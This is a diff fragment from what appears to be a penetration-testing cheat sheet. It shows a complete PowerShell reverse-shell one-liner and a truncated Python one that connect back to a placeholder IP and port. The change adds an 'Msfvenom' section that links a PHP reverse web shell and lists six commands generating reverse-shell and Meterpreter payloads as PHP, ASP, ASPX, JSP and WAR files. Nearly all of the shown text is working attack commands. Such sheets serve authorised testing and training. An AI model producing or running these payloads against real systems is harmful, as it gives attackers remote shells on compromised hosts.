@@ -314,6 +314,20 @@ $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.S
 $ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP address>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
+Msfvenom
+
+```
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+Edit IP address and port
+
+$ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<Port> -f raw > shell.php
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP address> LPORT=<Port> -f raw > shell.php
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f asp > shell.asp
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f aspx > shell.aspx
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f raw > shell.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war > shell.war
+```
+
 #9 - Online Resources
 -----------------------------------------
 
